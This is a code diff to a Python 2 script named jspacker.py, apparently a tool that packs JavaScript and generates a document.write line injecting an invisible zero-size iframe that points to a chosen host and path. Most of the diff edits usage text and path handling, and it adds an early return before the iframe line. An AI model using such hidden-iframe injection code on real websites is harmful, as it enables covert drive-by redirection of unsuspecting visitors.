@@ -9,11 +9,7 @@
 
 import os, re, sys
 import optparse
-try:
-    from netifaces import interfaces, ifaddresses, AF_INET
-except ImportError:
-    print 'Except: sudo pip install netifaces\n'
-    sys.exit()
+from netifaces import interfaces, ifaddresses, AF_INET
 # a multi-pattern parser
 
 class Pattern:
@@ -496,11 +492,10 @@ class optParser:
         return script
 
     def dataRewritePath(self, opt_path):
-        if opt_path:
-            if bool(re.search('^/.*$',opt_path)):
-                opt_path = opt_path[1:]
-            if bool(re.search('^.*/$',opt_path)):
-                opt_path = opt_path[:-1]
+        if bool(re.search('^/.*$',opt_path)):
+            opt_path = opt_path[1:]
+        if bool(re.search('^.*/$',opt_path)):
+            opt_path = opt_path[:-1]
         return opt_path
 
     def dataRewriteEth(self, opt_eth): 
@@ -525,16 +520,17 @@ class optParser:
             if opt_path:
                 full_path = 'http://%s/%s/%s' %(ip_addr,opt_path,opt_name)
             else:
-                full_path = 'http://%s/%s' %(ip_addr,opt_name)
+                full_path = 'http://%s/' %(ip_addr)
         else:
             print 'domain: %s' %opt_eth
             if opt_path:
                 full_path = 'http://%s/%s/%s' %(opt_eth,opt_path,opt_name)
             else:
-                full_path = 'http://%s/%s' %(opt_eth,opt_name)
+                full_path = 'http://%s/' %(opt_eth)
         print 'path: %s' %opt_path
         print 'file: %s' %opt_name
         print 'full path: %s' %full_path
+        return full_path
         ori_js = 'document.write(\\\"<iframe src=\\\''+full_path+'\\\' width=\\\'0\\\' height=\\\'0\\\'><\\/iframe>\");'
         return ori_js
     
@@ -558,8 +554,10 @@ def run():
 
 ##  Ported to Python by Florian Schulze
 ##  Add to optparse by Hakawati
-    print '\nVersion: 0.2'
-    parser =  optparse.OptionParser('\n\tjspacker.py -i [input file name] -o [output file name]\n' + \
+
+    parser =  optparse.OptionParser('\nVersion: 0.2\n\n' + \
+                                    'USAGE:\n' + \
+                                    '\tjspacker.py -i [input file name] -o [output file name]\n' + \
 				    '\tjspacker.py -e [input network interface or domain] -t ' + \
                                         '[input URI] -n [file name] -o [output file name]\n' + \
 				    '\t(if -o option is null, default use out.js)\n' + \
@@ -602,7 +600,7 @@ def run():
 
     except TypeError as e:
         parser.print_help()
-#        print e
+#        print e:
 
 
 def run1():
